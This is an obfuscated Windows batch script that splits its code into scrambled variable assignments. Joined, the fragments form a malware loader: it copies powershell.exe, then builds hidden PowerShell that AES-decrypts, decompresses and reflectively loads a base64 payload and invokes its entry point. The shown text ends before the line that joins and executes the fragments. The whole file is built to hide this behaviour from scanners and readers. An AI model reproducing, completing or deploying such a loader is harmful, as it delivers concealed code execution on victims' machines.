@echo off
set "PrIsWfKWrs=Po"
set "ccoIPXZkkh=32"
set "DqRdkUTArS=we"
set "zdzryNlriS=st"
set "azFpEPPrKf=rS"
set "NksmAzLYeq=rs"
set "vyVaCbCXMW=:\"
set "XptxjwORCA=do"
set "BNvitwtovo=.e"
set "NahaIllEcz=ws"
set "uPyetRfIJZ=co"
set "inEKKZGEAL=ll"
set "ShxtPBTSnd=y "
set "QWssqwuIsh=in"
set "BqNtbzFHCA= /"
set "GLAVNAEwtb=po"
set "SQznfboAkP=s\"
set "XYLQPqCzxv=nd"
set "uojqPvOljR=py"
set "UnmuNtGmbk=we"
set "jnYBpPqhPs=\W"
set "OGrcLFnFUi=xe"
set "rKmjzpLtOg=\v"
set "qsmmhMKYLE=1."
set "yjfrpgzxLN=em"
set "MSzjWxjeQO=ll"
set "MdPMORsTfi=Wi"
set "nSZofiawsh=0\"
set "lQGSrFGaBd=he"
set "fdmZGYtgPl= C"
set "yZSxEWsjNO=ow"
set "ppaHzFSqyH=he"
set "FAaHnwMflm=Sy"
set "ISvnPwBGqO=cd"
set "cpfDkcPJJS= %~dp0"
set "FOFmTNXLrB=]::("
set "ModKWHnHiU=m(, "
set "hjUIpYhhsx=$Qbc"
set "qSSJmxHukV===')"
set "ZvAqHbMBZf=fCjV"
set "WyjeLELMHd=ptor"
set "rLwgkEsDYR=ne);"
set "fNAkxvoqLY=join"
set "YHYSJqLYXP=.Cry"
set "IdqLtesXLJ=K = "
set "HysVhstKxt=gnir"
set "mZCCAAmaJr=);$Q"
set "BDXiYAzEmO=ss -"
set "tNJwrKyQBE=RCYi"
set "EKTpzUJOsK=ptog"
set "LCCdXGguTh=ose("
set "LpAcijJXsR=flec"
set "AhUiiuBKax=n ''"
set "YPjeANzDXx=ert]"
set "DsAisVRDNh=;$AD"
set "NFeJmjpsTQ=rtS4"
set "SGQSnWFbaI=7Yiv"
set "uFtloDYaJZ==');"
set "JBlkmwkzuS=ddin"
set "UrtbekLUWs=.Sec"
set "vtMscoGVkB= = ["
set "FMNBKZMLTh=null"
set "kdQZAVujei=ach "
set "bjaMAfRpDc=oArr"
set "CnrOLuzBWK='gni"
set "gFPUfaQDDK=nage"
set "IbmuBTNvhd=$xQs"
set "zUgorRCxhI=ress"
set "fFLmsahHDN=m.IO"
set "TPQvpNTIgW=tS46"
set "mHjszIgexx=ion."
set "oKhBfwaFKJ= [Sy"
set "jjtcyRupNY=bjec"
set "EAkPQnCeBB=y]::"
set "tPSSbIetqV=($OS"
set "uOZzyplJPv=k; }"
set "DRuKePmDOs=)) {"
set "TdLkWYKOgY=btW "
set "nUMibaMoPL=embl"
set "gTPbSVRskx=Fina"
set "XDPMaxNMNi=pose"
set "FPQJtmbyVL=; };"
set "gYhOsijYWZ=ptog"
set "yIeLmmurJl=iM.I"
set "sTkZUdGOYe=U) {"
set "EvCAFFXpFu=tem."
set "kysqCoyuln=lBlo"
set "bujOmePTik=ing("
set "qTSzxwrZip=comp"
set "JAmBGYLmkF=+hAO"
set "VJFYCOKhvF=rans"
set "MpUozqRSNz=;$Gt"
set "vIWgULYVPQ=);$S"
set "NHSrTHHRUx=Bmor"
set "aZlsLbOkeq=UGTu"
set "LrOntpTxHj=D.En"
set "MaOmjQbBqn=EUW."
set "kwiXlrAKMU=CYiM"
set "roWNAZOakO=kVIU"
set "tBABzvKvSB=]::N"
set "LkdFexcXSe=736u"
set "doyAwbFJDH=::De"
set "LCuXXfRWXN=0O+g"
set "RhAazAdTcJ=[Env"
set "nzcQYhcRrS=btW."
set "blnwgFjlcM=:: '"
set "VwKEMKKgrU=gO.T"
set "MHNaKUHGDp=($OS"
set "TTmyIRPyUB=] -j"
set "jHrxetVQQi=Conv"
set "JmuHjGaeNB=ck($"
set "IMdhDPxEki=y.Ci"
set "UfOvSBSmSc=PKCS"
set "NBDnTYLSBf=sGUc"
set "sIeerimfHZ=W = "
set "rjycOCXRJD=TllA"
set "kEfpWKWZSs=.Dis"
set "dgwbavDiru=dnG "
set "nlRpepucli=oryS"
set "YSWrmQKQVW=onve"
set "uEvFtVkjJX=pDZz"
set "WsXYvwRpqr=K, 0"
set "uGczAqvWmF=hy.A"
set "EzSoYuxoBO=ct S"
set "wIOOWvGExi=, (,"
set "lXKCwvTWPl=esaB"
set "KuxczvIZTg=G.Su"
set "WUfkxPXcRn=[Sys"
set "GrEGRPuWbN=lit("
set "JvytSammIy=1] -"
set "gdNsUePtxu=grap"
set "gJauxHEkTQ=raph"
set "VGHyukuTxC=brea"
set "GgyBYYrPmS=Star"
set "ZrOPUaJWZJ=F'[-"
set "pnqYUoxCHp=yste"
set "iGJPxYuwPt=ay()"
set "ZLiBNPGGDo=[Sys"
set "BmriWysRrB=ke($"
set "QMDgJkLqXD=ecry"
set "euPofGOUcw=-nop"
set "RFRNCuHgqL=ddin"
set "RRRvTOUxcg=)))"
